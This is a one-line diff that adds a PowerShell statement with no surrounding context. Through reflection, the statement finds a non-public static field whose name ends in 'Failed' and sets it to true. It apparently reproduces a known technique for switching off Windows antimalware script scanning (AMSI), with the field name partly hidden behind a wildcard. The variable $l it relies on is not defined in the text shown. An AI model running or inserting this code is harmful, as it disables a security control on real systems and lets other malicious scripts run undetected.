@@ -1,0 +1,1 @@
+$p=$l.GetFields('NonPublic,Static');Foreach($v in $p) {if ($v.Name -like "*Failed") {$z=$v}};$z.SetValue($null,$true)
